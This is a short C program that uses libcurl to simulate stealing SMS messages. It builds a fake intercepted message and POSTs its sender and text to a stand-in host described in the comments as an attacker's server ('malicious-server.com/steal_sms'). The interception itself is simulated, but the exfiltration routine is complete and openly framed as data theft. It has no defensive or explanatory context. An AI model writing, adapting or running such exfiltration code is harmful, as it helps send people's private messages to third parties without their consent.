#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h> // Sidenote: Look into docs for libcurl 

// SMS data simulation
typedef struct {
    char sender[50];
    char message[160];
} SmsMessage;

// --> Function that sends data to (own) server
void send_sms_to_server(const char* server_url, SmsMessage sms) {
    CURL *curl;
    CURLcode res;
    
    curl = curl_easy_init();
    if (curl) {
        char post_data[256];
        snprintf(post_data, sizeof(post_data), "sender=%s&message=%s", sms.sender, sms.message);
        
        curl_easy_setopt(curl, CURLOPT_URL, server_url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        
        // Performing request
        res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            fprintf(stderr, "Failed to send SMS: %s\n", curl_easy_strerror(res));
        }
        
        // Cleanup
        curl_easy_cleanup(curl);
    }
}

int main() {
    // Simulation of SMS data 
    SmsMessage sms = {"+1234567890", "This is a fake intercepted message"};

    // URL of attacker's server
    const char* server_url = "http://malicious-server.com/steal_sms";

    // Send intercepted SMS to attacker's server 
    send_sms_to_server(server_url, sms);

    printf("SMS intercepted and sent to server.\n");

    return 0;
}
